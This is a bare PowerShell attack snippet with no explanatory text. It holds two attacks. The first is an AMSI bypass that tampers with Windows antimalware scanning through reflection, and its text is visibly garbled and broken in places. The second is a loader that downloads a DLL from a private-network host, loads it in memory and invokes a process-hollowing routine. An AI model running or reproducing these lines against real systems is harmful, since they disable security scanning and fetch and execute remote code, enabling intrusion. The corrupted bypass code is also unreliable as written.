#AMSIBYPASS
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$dlds('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = m.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)  

#PROCESS HOLLOWING
$url = 'http://192.168.178.32/test.dll'
$data = (New-Object System.Net.WebClient).DownloadData($url)
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ProcessHollowing.Hollowing")
$method = $class.GetMethod("Runner")
$method.Invoke($null, $null)
